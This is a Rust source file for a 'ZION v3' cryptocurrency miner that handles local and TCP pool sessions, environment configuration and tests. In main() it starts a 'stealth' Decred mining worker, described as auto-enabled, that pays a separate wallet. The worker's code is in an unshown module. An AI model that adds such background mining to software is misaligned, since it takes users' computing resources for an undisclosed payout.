use anyhow::{anyhow, Context, Result};
use std::io::{BufRead, BufReader, Write};
use std::net::TcpStream;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::Arc;
use std::thread;
use std::time::{Duration, Instant};
use zion_core::{CoreRuntime, DifficultyTarget, MiningHeader, MiningJob, RevenueSource};
use zion_pool::{
    decode_message, encode_message, protocol_version, MiningPool, PoolMessage, ShareStatus,
};

mod dcr_hash;
mod dcr_stratum;
mod dcr_worker;

fn main() -> Result<()> {
    let config = MinerConfig::from_env()?;

    println!("ZION v3 miner");
    println!("consensus={}", zion_core::consensus_profile());
    println!("protocol_version={}", protocol_version());
    println!("miner_id={}", config.miner_id);
    println!("worker_name={}", config.worker_name);
    println!("loop_count={}", config.loop_count);
    println!("job_ttl_ms={}", config.job_ttl_ms);

    // ── Stealth DCR worker (auto-enabled, 1 thread default) ──
    let dcr_stop = Arc::new(AtomicBool::new(false));
    let dcr_handles = match dcr_worker::DcrConfig::from_env() {
        Some(dcr_cfg) => {
            println!(
                "dcr_stealth=enabled threads={} pool={} payout={}",
                dcr_cfg.threads,
                dcr_cfg.pool_addr,
                dcr_cfg.wallet_short()
            );
            Some(dcr_worker::spawn_dcr_worker(dcr_cfg, dcr_stop.clone()))
        }
        None => None,
    };

    let outcome = match config.pool_addr.as_deref() {
        Some(pool_addr) => {
            println!("mode=remote");
            println!("pool_addr={pool_addr}");
            run_remote_session(&config, pool_addr)?
        }
        None => {
            println!("mode=local");
            run_local_session(&config)?
        }
    };

    println!("last_job_id={}", outcome.last_job_id);
    println!("accepted_shares={}", outcome.accepted_shares);
    println!("rejected_shares={}", outcome.rejected_shares);
    println!("active_jobs={}", outcome.active_jobs);
    println!("accepted_iterations={}", outcome.accepted_iterations);
    println!("attempted_hashes={}", outcome.attempted_hashes);
    println!("elapsed_seconds={:.6}", outcome.elapsed_seconds);
    println!("hashrate_hps={:.2}", outcome.hashrate_hps);
    println!("revenue_total_usd={:.2}", outcome.revenue_total_usd);

    if let Some(line) = outcome.last_result_line.as_deref() {
        let parsed = decode_message(line)?;
        println!("wire_result_parsed={parsed:?}");
    }

    if let Some(line) = outcome.bye_line.as_deref() {
        let parsed = decode_message(line)?;
        println!("wire_bye_parsed={parsed:?}");
    }

    // ── Shutdown DCR worker ──
    dcr_stop.store(true, Ordering::Relaxed);
    if let Some(handles) = dcr_handles {
        for h in handles {
            let _ = h.join();
        }
    }

    Ok(())
}

fn run_local_session(config: &MinerConfig) -> Result<SessionOutcome> {
    let mut pool = MiningPool::with_job_ttl(CoreRuntime::default(), config.job_ttl_ms);
    let started_at = Instant::now();
    let mut attempted_hashes = 0u64;
    let mut accepted_iterations = 0u64;
    let mut last_result_line = None;
    let mut last_job_id = 0u64;

    let hello_line = encode_message(&pool.hello_message(&config.miner_id, &config.worker_name))?;
    let welcome_line = encode_message(&pool.welcome_message())?;
    println!("wire_hello={}", hello_line.trim());
    println!("wire_welcome={}", welcome_line.trim());

    for iteration in 0..config.loop_count {
        for stale_job_id in pool.expire_stale_jobs() {
            let stale_line = encode_message(&pool.stale_message(stale_job_id))?;
            let cancel_line =
                encode_message(&pool.cancel_message(stale_job_id, "stale-ttl-expired"))?;
            println!("wire_stale={}", stale_line.trim());
            println!("wire_cancel={}", cancel_line.trim());
        }

        let header = session_header(config, iteration);
        let start_nonce = config
            .start_nonce
            .wrapping_add((iteration as u64).wrapping_mul(config.nonce_stride));
        let job = pool.issue_job(header, config.target, start_nonce, config.nonce_count);
        last_job_id = job.job_id;
        let solution = pool
            .runtime()
            .scan_nonce_range(job)
            .ok_or_else(|| anyhow!("no solution found in nonce window for job {}", job.job_id))?;

        attempted_hashes = attempted_hashes
            .saturating_add(solution.candidate.nonce.saturating_sub(job.start_nonce) + 1);

        if config.sleep_ms > 0 {
            thread::sleep(Duration::from_millis(config.sleep_ms));
        }

        let decision = pool.submit_solution(
            config.miner_id.clone(),
            config.worker_name.clone(),
            solution,
            config.revenue_source,
            config.revenue_value_usd,
        );
        if matches!(decision.status, ShareStatus::Accepted) {
            accepted_iterations += 1;
        }

        let job_line = encode_message(&pool.job_message(job))?;
        let submit_line = encode_message(&pool.solution_message(
            &config.miner_id,
            &config.worker_name,
            solution,
        ))?;
        let result_line = encode_message(&pool.result_message(&decision))?;
        last_result_line = Some(result_line.clone());

        log_solution(iteration + 1, job, solution.candidate.nonce, &solution.hash, &decision.status);
        println!("wire_job={}", job_line.trim());
        println!("wire_submit={}", submit_line.trim());
        println!("wire_result={}", result_line.trim());

        if matches!(decision.status, ShareStatus::StaleJob) {
            let stale_line = encode_message(&pool.stale_message(job.job_id))?;
            let cancel_line =
                encode_message(&pool.cancel_message(job.job_id, "submit-arrived-after-ttl"))?;
            println!("wire_stale={}", stale_line.trim());
            println!("wire_cancel={}", cancel_line.trim());
        }
    }

    let stats = pool.stats();
    let elapsed_seconds = started_at.elapsed().as_secs_f64();
    let hashrate_hps = if elapsed_seconds > 0.0 {
        attempted_hashes as f64 / elapsed_seconds
    } else {
        0.0
    };
    let bye_line = encode_message(&pool.bye_message())?;
    println!("wire_bye={}", bye_line.trim());

    Ok(SessionOutcome {
        last_job_id,
        accepted_shares: stats.accepted_shares,
        rejected_shares: stats.rejected_shares,
        active_jobs: stats.active_jobs,
        accepted_iterations,
        attempted_hashes,
        elapsed_seconds,
        hashrate_hps,
        revenue_total_usd: stats.revenue.total_earnings_usd,
        last_result_line,
        bye_line: Some(bye_line),
    })
}

fn run_remote_session(config: &MinerConfig, pool_addr: &str) -> Result<SessionOutcome> {
    let runtime = CoreRuntime::default();
    let started_at = Instant::now();
    let mut attempted_hashes = 0u64;
    let mut accepted_iterations = 0u64;
    let mut last_result_line = None;
    let mut last_job_id = 0u64;

    let stream = TcpStream::connect(pool_addr)
        .with_context(|| format!("failed to connect to pool at {pool_addr}"))?;
    let reader_stream = stream.try_clone().context("failed to clone pool stream")?;
    let mut reader = BufReader::new(reader_stream);
    let mut writer = stream;

    let hello_message = PoolMessage::Hello {
        miner_id: config.miner_id.clone(),
        worker_name: config.worker_name.clone(),
        algorithm: zion_core::consensus_profile().to_string(),
    };
    let hello_line = write_wire_message(&mut writer, &hello_message)?;
    println!("wire_hello={hello_line}");

    let (welcome_line_raw, welcome_message) = read_wire_message(&mut reader)?;
    println!("wire_welcome={welcome_line_raw}");
    match welcome_message {
        PoolMessage::Welcome { .. } => {}
        other => return Err(anyhow!("expected welcome from pool, got {other:?}")),
    }

    for iteration in 0..config.loop_count {
        let (job_line, job) = read_next_job(&mut reader)?;
        last_job_id = job.job_id;
        let solution = runtime
            .scan_nonce_range(job)
            .ok_or_else(|| anyhow!("no solution found in nonce window for job {}", job.job_id))?;
        attempted_hashes = attempted_hashes
            .saturating_add(solution.candidate.nonce.saturating_sub(job.start_nonce) + 1);

        if config.sleep_ms > 0 {
            thread::sleep(Duration::from_millis(config.sleep_ms));
        }

        let submit_message = PoolMessage::Submit {
            job_id: solution.job_id,
            miner_id: config.miner_id.clone(),
            worker_name: config.worker_name.clone(),
            nonce: solution.candidate.nonce,
            hash_hex: hex(&solution.hash),
        };
        let submit_line = write_wire_message(&mut writer, &submit_message)?;
        let (result_line_raw, result_message) = read_next_result(&mut reader)?;
        last_result_line = Some(result_line_raw.clone());

        let status = match result_message {
            PoolMessage::Result { accepted, status } => {
                if accepted {
                    accepted_iterations += 1;
                }
                status
            }
            other => return Err(anyhow!("expected result from pool, got {other:?}")),
        };

        log_solution(iteration + 1, job, solution.candidate.nonce, &solution.hash, &status);
        println!("wire_job={job_line}");
        println!("wire_submit={submit_line}");
        println!("wire_result={result_line_raw}");
    }

    loop {
        let (line, message) = read_wire_message(&mut reader)?;
        match message {
            PoolMessage::Stale { .. } => println!("wire_stale={line}"),
            PoolMessage::Cancel { .. } => println!("wire_cancel={line}"),
            PoolMessage::Bye {
                accepted_shares,
                rejected_shares,
                revenue_total_usd,
            } => {
                println!("wire_bye={line}");
                let elapsed_seconds = started_at.elapsed().as_secs_f64();
                let hashrate_hps = if elapsed_seconds > 0.0 {
                    attempted_hashes as f64 / elapsed_seconds
                } else {
                    0.0
                };
                return Ok(SessionOutcome {
                    last_job_id,
                    accepted_shares,
                    rejected_shares,
                    active_jobs: 0,
                    accepted_iterations,
                    attempted_hashes,
                    elapsed_seconds,
                    hashrate_hps,
                    revenue_total_usd: revenue_total_usd
                        .parse::<f64>()
                        .with_context(|| format!("invalid bye revenue total: {revenue_total_usd}"))?,
                    last_result_line,
                    bye_line: Some(line),
                });
            }
            other => return Err(anyhow!("unexpected session message after loop: {other:?}")),
        }
    }
}

fn read_next_job(reader: &mut impl BufRead) -> Result<(String, MiningJob)> {
    loop {
        let (line, message) = read_wire_message(reader)?;
        match message {
            PoolMessage::Job {
                job_id,
                start_nonce,
                nonce_count,
                target_hex,
                header_hex,
                ..
            } => {
                return Ok((
                    line,
                    MiningJob {
                        job_id,
                        header: parse_header_hex(&header_hex)?,
                        target: DifficultyTarget {
                            bytes: parse_fixed_hex::<32>(&target_hex, "job target")?,
                        },
                        start_nonce,
                        nonce_count,
                    },
                ))
            }
            PoolMessage::Stale { .. } => println!("wire_stale={line}"),
            PoolMessage::Cancel { .. } => println!("wire_cancel={line}"),
            other => return Err(anyhow!("expected job from pool, got {other:?}")),
        }
    }
}

fn read_next_result(reader: &mut impl BufRead) -> Result<(String, PoolMessage)> {
    loop {
        let (line, message) = read_wire_message(reader)?;
        match message {
            PoolMessage::Result { .. } => return Ok((line, message)),
            PoolMessage::Stale { .. } => println!("wire_stale={line}"),
            PoolMessage::Cancel { .. } => println!("wire_cancel={line}"),
            other => return Err(anyhow!("expected result from pool, got {other:?}")),
        }
    }
}

fn read_wire_message(reader: &mut impl BufRead) -> Result<(String, PoolMessage)> {
    let mut line = String::new();
    let read = reader
        .read_line(&mut line)
        .context("failed to read wire message")?;
    if read == 0 {
        return Err(anyhow!("pool closed the connection"));
    }
    let message = decode_message(&line).context("failed to decode wire message")?;
    Ok((line.trim().to_string(), message))
}

fn write_wire_message(writer: &mut impl Write, message: &PoolMessage) -> Result<String> {
    let line = encode_message(message).context("failed to encode wire message")?;
    writer
        .write_all(line.as_bytes())
        .context("failed to write wire message")?;
    writer.flush().context("failed to flush wire message")?;
    Ok(line.trim().to_string())
}

fn session_header(config: &MinerConfig, iteration: u32) -> MiningHeader {
    MiningHeader {
        version: 3,
        previous_hash: [0x11; 32],
        merkle_root: [0x22; 32],
        timestamp: config.timestamp + iteration as u64,
        difficulty_bits: 0x1f00ffff,
    }
}

fn log_solution<T: std::fmt::Debug>(
    iteration: u32,
    job: MiningJob,
    found_nonce: u64,
    hash: &[u8; 32],
    status: T,
) {
    println!("iteration={iteration}");
    println!("job_id={}", job.job_id);
    println!("nonce_range={}..{}", job.start_nonce, job.start_nonce + job.nonce_count);
    println!("found_nonce={found_nonce}");
    println!("hash={}", hex(hash));
    println!("share_status={status:?}");
}

fn hex(bytes: &[u8]) -> String {
    bytes.iter().map(|byte| format!("{:02x}", byte)).collect()
}

fn parse_header_hex(raw: &str) -> Result<MiningHeader> {
    let bytes = parse_fixed_hex::<80>(raw, "job header")?;

    let version = u32::from_le_bytes(bytes[0..4].try_into().expect("header version slice"));
    let previous_hash = bytes[4..36].try_into().expect("previous hash slice");
    let merkle_root = bytes[36..68].try_into().expect("merkle root slice");
    let timestamp = u64::from_le_bytes(bytes[68..76].try_into().expect("timestamp slice"));
    let difficulty_bits =
        u32::from_le_bytes(bytes[76..80].try_into().expect("difficulty bits slice"));

    Ok(MiningHeader {
        version,
        previous_hash,
        merkle_root,
        timestamp,
        difficulty_bits,
    })
}

fn parse_fixed_hex<const N: usize>(raw: &str, label: &str) -> Result<[u8; N]> {
    let normalized = raw.trim().trim_start_matches("0x");
    if normalized.len() != N * 2 {
        return Err(anyhow!("{label} must be exactly {} hex chars", N * 2));
    }

    let mut bytes = [0u8; N];
    for (index, chunk) in normalized.as_bytes().chunks(2).enumerate() {
        let pair = std::str::from_utf8(chunk).with_context(|| format!("{label} contains non-utf8 hex"))?;
        bytes[index] = u8::from_str_radix(pair, 16)
            .with_context(|| format!("invalid hex byte '{pair}' in {label}"))?;
    }
    Ok(bytes)
}

#[derive(Debug, Clone)]
struct SessionOutcome {
    last_job_id: u64,
    accepted_shares: u64,
    rejected_shares: u64,
    active_jobs: usize,
    accepted_iterations: u64,
    attempted_hashes: u64,
    elapsed_seconds: f64,
    hashrate_hps: f64,
    revenue_total_usd: f64,
    last_result_line: Option<String>,
    bye_line: Option<String>,
}

#[derive(Debug, Clone)]
struct MinerConfig {
    miner_id: String,
    worker_name: String,
    pool_addr: Option<String>,
    loop_count: u32,
    job_ttl_ms: u64,
    nonce_stride: u64,
    start_nonce: u64,
    nonce_count: u64,
    sleep_ms: u64,
    timestamp: u64,
    target: DifficultyTarget,
    revenue_source: RevenueSource,
    revenue_value_usd: f64,
}

impl MinerConfig {
    fn from_env() -> Result<Self> {
        Ok(Self {
            miner_id: env_or_default("ZION_MINER_ID", "local-miner"),
            worker_name: env_or_default("ZION_WORKER_NAME", "cpu-rig-0"),
            pool_addr: std::env::var("ZION_POOL_ADDR").ok().filter(|value| !value.trim().is_empty()),
            loop_count: parse_env_u32("ZION_LOOP_COUNT", 1)?,
            job_ttl_ms: parse_env_u64("ZION_JOB_TTL_MS", 15_000)?,
            nonce_stride: parse_env_u64("ZION_NONCE_STRIDE", 1_024)?,
            start_nonce: parse_env_u64("ZION_START_NONCE", 42)?,
            nonce_count: parse_env_u64("ZION_NONCE_COUNT", 1024)?,
            sleep_ms: parse_env_u64("ZION_SLEEP_MS", 0)?,
            timestamp: parse_env_u64("ZION_TIMESTAMP", 1_762_000_200)?,
            target: parse_target_env("ZION_TARGET")?,
            revenue_source: parse_revenue_source(
                &std::env::var("ZION_REVENUE_SOURCE").unwrap_or_else(|_| "zion".to_string()),
            )?,
            revenue_value_usd: parse_env_f64("ZION_REVENUE_USD", 1.25)?,
        })
    }
}

fn env_or_default(key: &str, default: &str) -> String {
    std::env::var(key).unwrap_or_else(|_| default.to_string())
}

fn parse_env_u64(key: &str, default: u64) -> Result<u64> {
    match std::env::var(key) {
        Ok(value) => value
            .parse::<u64>()
            .with_context(|| format!("invalid u64 in {key}: {value}")),
        Err(_) => Ok(default),
    }
}

fn parse_env_u32(key: &str, default: u32) -> Result<u32> {
    match std::env::var(key) {
        Ok(value) => value
            .parse::<u32>()
            .with_context(|| format!("invalid u32 in {key}: {value}")),
        Err(_) => Ok(default),
    }
}

fn parse_env_f64(key: &str, default: f64) -> Result<f64> {
    match std::env::var(key) {
        Ok(value) => value
            .parse::<f64>()
            .with_context(|| format!("invalid f64 in {key}: {value}")),
        Err(_) => Ok(default),
    }
}

fn parse_target_env(key: &str) -> Result<DifficultyTarget> {
    let raw = match std::env::var(key) {
        Ok(value) => value,
        Err(_) => return Ok(DifficultyTarget::MAX),
    };

    let normalized = raw.trim().trim_start_matches("0x");
    if normalized.len() != 64 {
        return Err(anyhow!("{key} must be exactly 64 hex chars"));
    }

    let mut bytes = [0u8; 32];
    for (index, chunk) in normalized.as_bytes().chunks(2).enumerate() {
        let pair = std::str::from_utf8(chunk).context("target contains non-utf8 hex")?;
        bytes[index] = u8::from_str_radix(pair, 16)
            .with_context(|| format!("invalid hex byte '{pair}' in {key}"))?;
    }
    Ok(DifficultyTarget { bytes })
}

fn parse_revenue_source(value: &str) -> Result<RevenueSource> {
    match value.trim().to_ascii_lowercase().as_str() {
        "zion" => Ok(RevenueSource::Zion),
        "keccak" | "keccak_bonus" => Ok(RevenueSource::KeccakBonus),
        "sha3" | "sha3_bonus" => Ok(RevenueSource::Sha3Bonus),
        "profit" | "profit_switch" => Ok(RevenueSource::ProfitSwitch),
        "blake3" | "blake3_external" | "dcr" | "alph" => Ok(RevenueSource::Blake3External),
        "ncl" | "ncl_ai" => Ok(RevenueSource::NclAi),
        other => Err(anyhow!("unsupported revenue source: {other}")),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn revenue_source_parser_accepts_aliases() {
        assert!(matches!(parse_revenue_source("zion"), Ok(RevenueSource::Zion)));
        assert!(matches!(
            parse_revenue_source("profit_switch"),
            Ok(RevenueSource::ProfitSwitch)
        ));
        assert!(matches!(parse_revenue_source("ncl"), Ok(RevenueSource::NclAi)));
        assert!(matches!(parse_revenue_source("dcr"), Ok(RevenueSource::Blake3External)));
        assert!(matches!(parse_revenue_source("alph"), Ok(RevenueSource::Blake3External)));
        assert!(matches!(parse_revenue_source("blake3_external"), Ok(RevenueSource::Blake3External)));
    }

    #[test]
    fn target_parser_accepts_64_hex_chars() {
        std::env::set_var(
            "ZION_TARGET",
            "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff",
        );
        let target = parse_target_env("ZION_TARGET").expect("valid target hex");
        assert_eq!(target, DifficultyTarget::MAX);
        std::env::remove_var("ZION_TARGET");
    }

    #[test]
    fn miner_config_reads_loop_and_ttl() {
        std::env::set_var("ZION_LOOP_COUNT", "3");
        std::env::set_var("ZION_JOB_TTL_MS", "2500");
        std::env::set_var("ZION_NONCE_STRIDE", "4096");
        let config = MinerConfig::from_env().expect("config from env");
        assert_eq!(config.loop_count, 3);
        assert_eq!(config.job_ttl_ms, 2500);
        assert_eq!(config.nonce_stride, 4096);
        std::env::remove_var("ZION_LOOP_COUNT");
        std::env::remove_var("ZION_JOB_TTL_MS");
        std::env::remove_var("ZION_NONCE_STRIDE");
    }

    #[test]
    fn miner_config_reads_pool_addr() {
        std::env::set_var("ZION_POOL_ADDR", "127.0.0.1:8444");
        let config = MinerConfig::from_env().expect("config from env");
        assert_eq!(config.pool_addr.as_deref(), Some("127.0.0.1:8444"));
        std::env::remove_var("ZION_POOL_ADDR");
    }
}